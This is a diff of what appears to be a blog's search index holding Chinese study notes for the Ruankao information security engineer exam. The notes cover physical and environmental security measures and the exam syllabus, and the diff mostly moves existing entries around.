-<li><strong>基于环境攻击</strong>：利用电磁波、温度、湿度等外部环境缺陷破坏系统运行。</li>
-</ul>
-<p><img src="../uploads/IC木马植入.png" alt=""></p>
-<h3 id="三、-物理安全保护体系"><a href="#三、-物理安全保护体系" class="headerlink" title="三、 物理安全保护体系"></a>三、 物理安全保护体系</h3><h4 id="1-保护维度"><a href="#1-保护维度" class="headerlink" title="1. 保护维度"></a>1. 保护维度</h4><ul>
-<li><strong>设备物理安全</strong>：标志标记、防电磁泄露/干扰、电源保护、抗震动、供应链安全（防木马）。</li>
-<li><strong>环境物理安全</strong>：机房选址、屏蔽、防火/水/雷/鼠/盗、供电及空调系统。</li>
-<li><strong>系统物理安全</strong>：介质安全、灾难备份、访问控制、资源利用。</li>
-</ul>
-<h4 id="2-保护方法"><a href="#2-保护方法" class="headerlink" title="2. 保护方法"></a>2. 保护方法</h4><ul>
-<li>安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链管理、容灾备份。</li>
-</ul>
-<h4 id="3-分级标准"><a href="#3-分级标准" class="headerlink" title="3. 分级标准"></a>3. 分级标准</h4><p>依据《信息系统物理安全技术要求（GB/T 21052-2007）》，分为四个等级：</p>
-<ul>
-<li>第一级：用户自主保护级（基本保护）。</li>
-<li>第二级：系统审计保护级（适当保护）。</li>
-<li>第三级：安全标记保护级（较高程度保护）。</li>
-<li>第四级：结构化保护级（更高程度保护）。</li>
-</ul>
-<h3 id="四、-物理环境安全分析与防护（具体措施）"><a href="#四、-物理环境安全分析与防护（具体措施）" class="headerlink" title="四、 物理环境安全分析与防护（具体措施）"></a>四、 物理环境安全分析与防护（具体措施）</h3><p>针对具体的环境风险，采取了以下针对性措施：</p>
-<ol>
-<li><strong>防火</strong>：消除隐患、安装报警系统、配置灭火设备、加强管理规范。</li>
-<li><strong>防水</strong>：<ul>
-<li>机房内禁铺水管（或做防漏措施）。</li>
-<li>墙壁/天花板/地面需防水防潮。</li>
-<li>选址避免底层或地下室，防止雨水倒灌。</li>
-</ul>
-</li>
-<li><strong>防震</strong>：建筑物抗震、机柜设备固定、禁止移动在线设备。</li>
-<li><strong>防盗</strong>：报警器、锁定装置、视频监控、严格的物理访问控制。</li>
-<li><strong>防鼠虫害</strong>：<ul>
-<li>封堵洞口。</li>
-<li>使用超声波驱鼠、捕鼠器、投放毒饵（需谨慎）。</li>
-<li>电缆使用防鼠涂层或毒饵。</li>
-</ul>
-</li>
-<li><strong>防雷</strong>：<ul>
-<li>安装避雷针。</li>
-<li>设备安全接地并连通地线网。</li>
-<li>重要设备加装专用防雷设施。</li>
-</ul>
-</li>
-<li><strong>防电磁</strong>：<ul>
-<li>目的：防止干扰和信息泄露。</li>
-<li>措施：接地、屏蔽、合理选址。</li>
-</ul>
-</li>
-<li><strong>防静电</strong>：<ul>
-<li>人员穿着防静电衣鞋、戴静电手套。</li>
-<li>控制机房温湿度。</li>
-<li>地板和工作台使用防静电材料/阻值达标。</li>
-</ul>
-</li>
-<li><strong>安全供电</strong>：<ul>
-<li>专用供电线路。</li>
-<li>配备不间断电源（UPS）。</li>
-<li>配备备用发电机。</li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>软考</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>漏洞防护</title>
     <url>/2026/03/09/%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4/</url>
     <content><![CDATA[<h2 id="一、网络安全漏洞概述"><a href="#一、网络安全漏洞概述" class="headerlink" title="一、网络安全漏洞概述"></a>一、网络安全漏洞概述</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><blockquote>
@@ -7164,6 +7059,111 @@
 <li><strong>ASLR</strong> 防缓冲区溢出；<strong>DEP</strong> 防内存区域执行；<strong>虚拟补丁</strong> 靠流量过滤</li>
 <li><strong>补丁管理6环节</strong>：现状分析→跟踪→验证→安装→应急→检查</li>
 <li><strong>漏洞防护网关产品</strong>：IPS / WAF / UTM</li>
+</ol>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>软考</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>物理环境安全分析与防护</title>
+    <url>/2026/02/04/%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4/</url>
+    <content><![CDATA[<h3 id="一、-物理安全的基本概念"><a href="#一、-物理安全的基本概念" class="headerlink" title="一、 物理安全的基本概念"></a>一、 物理安全的基本概念</h3><ol>
+<li><strong>定义</strong>：<ul>
+<li>传统上称为“实体安全”。</li>
+<li>它是网络信息系统安全、可靠、不间断运行的<strong>基本保证</strong>。</li>
+<li><strong>核心目标</strong>：保护支持系统运行的硬件（环境、设备、记录介质），防止因自然或人为因素导致信息丢失、泄露、破坏或服务中断。</li>
+</ul>
+</li>
+<li><strong>广义定义</strong>：<ul>
+<li>指由硬件、软件、操作人员、环境组成的“人、机、物”融合的网络信息物理系统的安全。</li>
+</ul>
+</li>
+</ol>
+<h3 id="二、-物理安全威胁分析"><a href="#二、-物理安全威胁分析" class="headerlink" title="二、 物理安全威胁分析"></a>二、 物理安全威胁分析</h3><p>威胁主要分为两大类：传统威胁与新型硬件威胁。</p>
+<h4 id="1-常见（传统）威胁"><a href="#1-常见（传统）威胁" class="headerlink" title="1. 常见（传统）威胁"></a>1. 常见（传统）威胁</h4><ul>
+<li><strong>自然威胁</strong>：地震、洪水、火灾、鼠害、雷电等。</li>
+<li><strong>人为威胁</strong>：盗窃、爆炸、毁坏、硬件攻击等。</li>
+</ul>
+<h4 id="2-新型硬件威胁"><a href="#2-新型硬件威胁" class="headerlink" title="2. 新型硬件威胁"></a>2. 新型硬件威胁</h4><p>具有隐蔽性、危害性、攻击主动性和非临近性。</p>
+<ul>
+<li><strong>硬件木马</strong>：<ul>
+<li>指在集成电路（IC）全生命周期（研发、制造、封装、应用）中植入的恶意电路。</li>
+<li>激活后会导致信息泄露或功能失控。</li>
+</ul>
+</li>
+<li><strong>硬件协同的恶意代码</strong>：利用硬件特性，使非授权软件访问特权内存区域。</li>
+<li><strong>硬件安全漏洞利用</strong>：<ul>
+<li>具有持久性和破坏性。</li>
+<li><strong>典型案例</strong>：2018年的“熔断”（Meltdown）和“幽灵”（Spectre）CPU漏洞，通过侧信道攻击获取缓存数据。</li>
+</ul>
+</li>
+<li><strong>基于软件漏洞攻击硬件实体</strong>：<ul>
+<li>利用控制系统软件漏洞修改物理配置，破坏硬件。</li>
+<li><strong>典型案例</strong>：“震网”（Stuxnet）病毒。</li>
+</ul>
+</li>
+<li><strong>基于环境攻击</strong>：利用电磁波、温度、湿度等外部环境缺陷破坏系统运行。</li>
+</ul>
+<p><img src="../uploads/IC木马植入.png" alt=""></p>
+<h3 id="三、-物理安全保护体系"><a href="#三、-物理安全保护体系" class="headerlink" title="三、 物理安全保护体系"></a>三、 物理安全保护体系</h3><h4 id="1-保护维度"><a href="#1-保护维度" class="headerlink" title="1. 保护维度"></a>1. 保护维度</h4><ul>
+<li><strong>设备物理安全</strong>：标志标记、防电磁泄露/干扰、电源保护、抗震动、供应链安全（防木马）。</li>
+<li><strong>环境物理安全</strong>：机房选址、屏蔽、防火/水/雷/鼠/盗、供电及空调系统。</li>
+<li><strong>系统物理安全</strong>：介质安全、灾难备份、访问控制、资源利用。</li>
+</ul>
+<h4 id="2-保护方法"><a href="#2-保护方法" class="headerlink" title="2. 保护方法"></a>2. 保护方法</h4><ul>
+<li>安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链管理、容灾备份。</li>
+</ul>
+<h4 id="3-分级标准"><a href="#3-分级标准" class="headerlink" title="3. 分级标准"></a>3. 分级标准</h4><p>依据《信息系统物理安全技术要求（GB/T 21052-2007）》，分为四个等级：</p>
+<ul>
+<li>第一级：用户自主保护级（基本保护）。</li>
+<li>第二级：系统审计保护级（适当保护）。</li>
+<li>第三级：安全标记保护级（较高程度保护）。</li>
+<li>第四级：结构化保护级（更高程度保护）。</li>
+</ul>
+<h3 id="四、-物理环境安全分析与防护（具体措施）"><a href="#四、-物理环境安全分析与防护（具体措施）" class="headerlink" title="四、 物理环境安全分析与防护（具体措施）"></a>四、 物理环境安全分析与防护（具体措施）</h3><p>针对具体的环境风险，采取了以下针对性措施：</p>
+<ol>
+<li><strong>防火</strong>：消除隐患、安装报警系统、配置灭火设备、加强管理规范。</li>
+<li><strong>防水</strong>：<ul>
+<li>机房内禁铺水管（或做防漏措施）。</li>
+<li>墙壁/天花板/地面需防水防潮。</li>
+<li>选址避免底层或地下室，防止雨水倒灌。</li>
+</ul>
+</li>
+<li><strong>防震</strong>：建筑物抗震、机柜设备固定、禁止移动在线设备。</li>
+<li><strong>防盗</strong>：报警器、锁定装置、视频监控、严格的物理访问控制。</li>
+<li><strong>防鼠虫害</strong>：<ul>
+<li>封堵洞口。</li>
+<li>使用超声波驱鼠、捕鼠器、投放毒饵（需谨慎）。</li>
+<li>电缆使用防鼠涂层或毒饵。</li>
+</ul>
+</li>
+<li><strong>防雷</strong>：<ul>
+<li>安装避雷针。</li>
+<li>设备安全接地并连通地线网。</li>
+<li>重要设备加装专用防雷设施。</li>
+</ul>
+</li>
+<li><strong>防电磁</strong>：<ul>
+<li>目的：防止干扰和信息泄露。</li>
+<li>措施：接地、屏蔽、合理选址。</li>
+</ul>
+</li>
+<li><strong>防静电</strong>：<ul>
+<li>人员穿着防静电衣鞋、戴静电手套。</li>
+<li>控制机房温湿度。</li>
+<li>地板和工作台使用防静电材料/阻值达标。</li>
+</ul>
+</li>
+<li><strong>安全供电</strong>：<ul>
+<li>专用供电线路。</li>
+<li>配备不间断电源（UPS）。</li>
+<li>配备备用发电机。</li>
+</ul>
+</li>
 </ol>
 ]]></content>
       <categories>
@@ -9019,167 +9019,6 @@
       </tags>
   </entry>
   <entry>
-    <title>软考信息安全工程师考点概述</title>
-    <url>/2026/01/03/%E8%BD%AF%E8%80%83%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%80%83%E7%82%B9%E6%A6%82%E8%BF%B0/</url>
-    <content><![CDATA[<p>软考信息安全工程师涉及到的考试章节和具体考点如下，科目一考点：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th><strong>章节名称</strong></th>
-<th><strong>章节内容</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1. 网络信息安全概述</td>
-<td>网络发展现状、安全属性、安全管理、生命周期</td>
-</tr>
-<tr>
-<td>2. 网络攻击原理与常用方法</td>
-<td>攻击概述、常见攻击方法、黑客常用工具、攻击案例</td>
-</tr>
-<tr>
-<td>3. 密码学基本理论</td>
-<td>概况、密码学体制、常见密码算法、数字签名、安全协议</td>
-</tr>
-<tr>
-<td>4. 网络安全体系与网络安全模型</td>
-<td>概述、网络安全体系模型、建设原则、建设内容、参考案例</td>
-</tr>
-<tr>
-<td>5. 物理与环境安全技术</td>
-<td>物理安全、环境安全、机房安全、通信安全、设备安全、介质安全</td>
-</tr>
-<tr>
-<td>6. 认证技术原理与应用</td>
-<td>概述、认证类型与认证过程、认证技术、认证产品和技术指标</td>
-</tr>
-<tr>
-<td>7. 访问控制技术原理与应用</td>
-<td>访问控制原理、模型、类型、策略设计与实现、安全管理、产品</td>
-</tr>
-<tr>
-<td>8. 防火墙技术原理与应用</td>
-<td>防火墙原理、类型与实现技术、产品与技术指标、体系结构</td>
-</tr>
-<tr>
-<td>9. VPN 技术原理与应用</td>
-<td>概述、类型和实现技术、产品与技术指标、技术应用</td>
-</tr>
-<tr>
-<td>10. 入侵检测技术原理与应用</td>
-<td>概述、入侵检测技术、组成与分类、产品与技术指标、应用</td>
-</tr>
-<tr>
-<td>11. 网络物理隔离技术原理与应用</td>
-<td>网络物理隔离概述、系统与类型、机制与技术、产品与指标</td>
-</tr>
-<tr>
-<td>12. 网络安全审计技术原理与应用</td>
-<td>安全审计概述、组成与类型、机制与实现技术、产品与技术</td>
-</tr>
-<tr>
-<td>13. 网络安全漏洞防护技术原理与应用</td>
-<td>网络安全漏洞概述、分类与管理、漏洞扫描技术、处置技术、产品</td>
-</tr>
-<tr>
-<td>14. 恶意代码防范技术原理</td>
-<td>计算机病毒、特洛伊木马、网络蠕虫、僵尸网络等</td>
-</tr>
-<tr>
-<td>15. 网络安全主动防御技术与应用</td>
-<td>入侵阻断、软件白名单、网络流量清洗、可信计算、数字水印等</td>
-</tr>
-<tr>
-<td>16. 网络安全风险评估技术原理与应用</td>
-<td>风险评估概述、评估过程、评估技术、工作流程</td>
-</tr>
-<tr>
-<td>17. 网络安全应急响应技术原理与应用</td>
-<td>网络安全应急响应概述、工作机制、预案内容、应急处理</td>
-</tr>
-<tr>
-<td>18. 网络安全测评技术与标准</td>
-<td>网络安全测评概述、类型、流程与内容、技术工具、标准</td>
-</tr>
-<tr>
-<td>19. 操作系统安全保护</td>
-<td>概述、Windows / Linux 操作系统安全、国产操作系统安全</td>
-</tr>
-<tr>
-<td>20. 数据库系统安全</td>
-<td>概述、安全机制和技术、Oracle、MS SQL、MySQL、国产数据库安全</td>
-</tr>
-<tr>
-<td>21. 网络设备安全</td>
-<td>网络设备安全概述、机制与技术、增强技术、漏洞和解决方法</td>
-</tr>
-<tr>
-<td>22. 网站安全需求分析与安全保护</td>
-<td>网络安全威胁、Apache Web 安全、IIS 安全、Web 漏洞、网站安全</td>
-</tr>
-<tr>
-<td>23. 云计算安全需求分析与安全保护</td>
-<td>云计算安全威胁、安全需求、安全保护机制与技术、案例</td>
-</tr>
-<tr>
-<td>24. 工控安全需求分析与安全保护</td>
-<td>工控系统安全威胁、安全需求、安全保护机制与技术、案例</td>
-</tr>
-<tr>
-<td>25. 移动应用安全需求分析与安全保护</td>
-<td>移动应用安全威胁、Android、iOS 安全、保护机制和技术、案例</td>
-</tr>
-<tr>
-<td>26. 大数据安全需求分析与安全保护</td>
-<td>大数据安全威胁、安全需求、安全保护机制与技术、案例</td>
-</tr>
-<tr>
-<td>专业英语</td>
-<td>专业英语</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>科目二考点：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th><strong>考试专题</strong></th>
-<th><strong>知识点</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>密码学</td>
-<td>1. 安全目标等基础概念。<br>2. RSA 加解密详细过程，其他加密算法概述。<br>3. 公钥私钥加解密、数字签名过程，文字表示及识图。<br>4. 密钥管理技术、安全认证协议等。</td>
-</tr>
-<tr>
-<td>网络安全</td>
-<td>1. 防火墙概念（iptables 过滤规则及配置命令）、体系结构、包过滤规则填表，Windows / Linux 配置。<br>2. 各种网络攻击和威胁，数据敏感度、隐私分类、隐私保护等。<br>3. 网络协议数据包含义分析。<br>4. 重要网络协议如 TCP、DNS、DHCP 等。<br>5. 华为交换机、路由器等安全配置命令。</td>
-</tr>
-<tr>
-<td>信息系统安全</td>
-<td>1. 信息安全概述、目标、访问控制原理、BLP 等模型。<br>2. C 语言代码漏洞分析，变量内存图等。<br>3. Linux 重要配置文件名及内容含义、文件权限、配置命令等。<br>4. Windows 重要配置：日志、防火墙、安全策略等界面。</td>
-</tr>
-<tr>
-<td>新技术</td>
-<td>移动应用——安卓系统和 iOS 系统；<br>数据敏感度、隐私保护、隐私分类等；<br>其他可能会考察的有：云计算、工控系统、移动应用、大数据、应急响应等安全新技术内容。</td>
-</tr>
-</tbody>
-</table>
-</div>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>软考</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>软考信息安全工程师2024真题选择</title>
     <url>/2025/12/23/%E8%BD%AF%E8%80%83%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%882024%E7%9C%9F%E9%A2%98%E9%80%89%E6%8B%A9/</url>
     <content><![CDATA[<h2 id="1-CWE-89-编号代表的漏洞类型是（-）"><a href="#1-CWE-89-编号代表的漏洞类型是（-）" class="headerlink" title="1. CWE-89 编号代表的漏洞类型是（ ）"></a>1. CWE-89 编号代表的漏洞类型是（ ）</h2><p>A. <strong>SQL 注入</strong>  B. 命令注入  C. 配置错误  D. 信息泄露</p>
@@ -10200,6 +10039,167 @@
 </ul>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>软考</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>软考信息安全工程师考点概述</title>
+    <url>/2026/01/03/%E8%BD%AF%E8%80%83%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%80%83%E7%82%B9%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<p>软考信息安全工程师涉及到的考试章节和具体考点如下，科目一考点：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>章节名称</strong></th>
+<th><strong>章节内容</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. 网络信息安全概述</td>
+<td>网络发展现状、安全属性、安全管理、生命周期</td>
+</tr>
+<tr>
+<td>2. 网络攻击原理与常用方法</td>
+<td>攻击概述、常见攻击方法、黑客常用工具、攻击案例</td>
+</tr>
+<tr>
+<td>3. 密码学基本理论</td>
+<td>概况、密码学体制、常见密码算法、数字签名、安全协议</td>
+</tr>
+<tr>
+<td>4. 网络安全体系与网络安全模型</td>
+<td>概述、网络安全体系模型、建设原则、建设内容、参考案例</td>
+</tr>
+<tr>
+<td>5. 物理与环境安全技术</td>
+<td>物理安全、环境安全、机房安全、通信安全、设备安全、介质安全</td>
+</tr>
+<tr>
+<td>6. 认证技术原理与应用</td>
+<td>概述、认证类型与认证过程、认证技术、认证产品和技术指标</td>
+</tr>
+<tr>
+<td>7. 访问控制技术原理与应用</td>
+<td>访问控制原理、模型、类型、策略设计与实现、安全管理、产品</td>
+</tr>
+<tr>
+<td>8. 防火墙技术原理与应用</td>
+<td>防火墙原理、类型与实现技术、产品与技术指标、体系结构</td>
+</tr>
+<tr>
+<td>9. VPN 技术原理与应用</td>
+<td>概述、类型和实现技术、产品与技术指标、技术应用</td>
+</tr>
+<tr>
+<td>10. 入侵检测技术原理与应用</td>
+<td>概述、入侵检测技术、组成与分类、产品与技术指标、应用</td>
+</tr>
+<tr>
+<td>11. 网络物理隔离技术原理与应用</td>
+<td>网络物理隔离概述、系统与类型、机制与技术、产品与指标</td>
+</tr>
+<tr>
+<td>12. 网络安全审计技术原理与应用</td>
+<td>安全审计概述、组成与类型、机制与实现技术、产品与技术</td>
+</tr>
+<tr>
+<td>13. 网络安全漏洞防护技术原理与应用</td>
+<td>网络安全漏洞概述、分类与管理、漏洞扫描技术、处置技术、产品</td>
+</tr>
+<tr>
+<td>14. 恶意代码防范技术原理</td>
+<td>计算机病毒、特洛伊木马、网络蠕虫、僵尸网络等</td>
+</tr>
+<tr>
+<td>15. 网络安全主动防御技术与应用</td>
+<td>入侵阻断、软件白名单、网络流量清洗、可信计算、数字水印等</td>
+</tr>
+<tr>
+<td>16. 网络安全风险评估技术原理与应用</td>
+<td>风险评估概述、评估过程、评估技术、工作流程</td>
+</tr>
+<tr>
+<td>17. 网络安全应急响应技术原理与应用</td>
+<td>网络安全应急响应概述、工作机制、预案内容、应急处理</td>
+</tr>
+<tr>
+<td>18. 网络安全测评技术与标准</td>
+<td>网络安全测评概述、类型、流程与内容、技术工具、标准</td>
+</tr>
+<tr>
+<td>19. 操作系统安全保护</td>
+<td>概述、Windows / Linux 操作系统安全、国产操作系统安全</td>
+</tr>
+<tr>
+<td>20. 数据库系统安全</td>
+<td>概述、安全机制和技术、Oracle、MS SQL、MySQL、国产数据库安全</td>
+</tr>
+<tr>
+<td>21. 网络设备安全</td>
+<td>网络设备安全概述、机制与技术、增强技术、漏洞和解决方法</td>
+</tr>
+<tr>
+<td>22. 网站安全需求分析与安全保护</td>
+<td>网络安全威胁、Apache Web 安全、IIS 安全、Web 漏洞、网站安全</td>
+</tr>
+<tr>
+<td>23. 云计算安全需求分析与安全保护</td>
+<td>云计算安全威胁、安全需求、安全保护机制与技术、案例</td>
+</tr>
+<tr>
+<td>24. 工控安全需求分析与安全保护</td>
+<td>工控系统安全威胁、安全需求、安全保护机制与技术、案例</td>
+</tr>
+<tr>
+<td>25. 移动应用安全需求分析与安全保护</td>
+<td>移动应用安全威胁、Android、iOS 安全、保护机制和技术、案例</td>
+</tr>
+<tr>
+<td>26. 大数据安全需求分析与安全保护</td>
+<td>大数据安全威胁、安全需求、安全保护机制与技术、案例</td>
+</tr>
+<tr>
+<td>专业英语</td>
+<td>专业英语</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>科目二考点：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>考试专题</strong></th>
+<th><strong>知识点</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>密码学</td>
+<td>1. 安全目标等基础概念。<br>2. RSA 加解密详细过程，其他加密算法概述。<br>3. 公钥私钥加解密、数字签名过程，文字表示及识图。<br>4. 密钥管理技术、安全认证协议等。</td>
+</tr>
+<tr>
+<td>网络安全</td>
+<td>1. 防火墙概念（iptables 过滤规则及配置命令）、体系结构、包过滤规则填表，Windows / Linux 配置。<br>2. 各种网络攻击和威胁，数据敏感度、隐私分类、隐私保护等。<br>3. 网络协议数据包含义分析。<br>4. 重要网络协议如 TCP、DNS、DHCP 等。<br>5. 华为交换机、路由器等安全配置命令。</td>
+</tr>
+<tr>
+<td>信息系统安全</td>
+<td>1. 信息安全概述、目标、访问控制原理、BLP 等模型。<br>2. C 语言代码漏洞分析，变量内存图等。<br>3. Linux 重要配置文件名及内容含义、文件权限、配置命令等。<br>4. Windows 重要配置：日志、防火墙、安全策略等界面。</td>
+</tr>
+<tr>
+<td>新技术</td>
+<td>移动应用——安卓系统和 iOS 系统；<br>数据敏感度、隐私保护、隐私分类等；<br>其他可能会考察的有：云计算、工控系统、移动应用、大数据、应急响应等安全新技术内容。</td>
+</tr>
+</tbody>
+</table>
+</div>
 ]]></content>
       <categories>
         <category>软考</category>
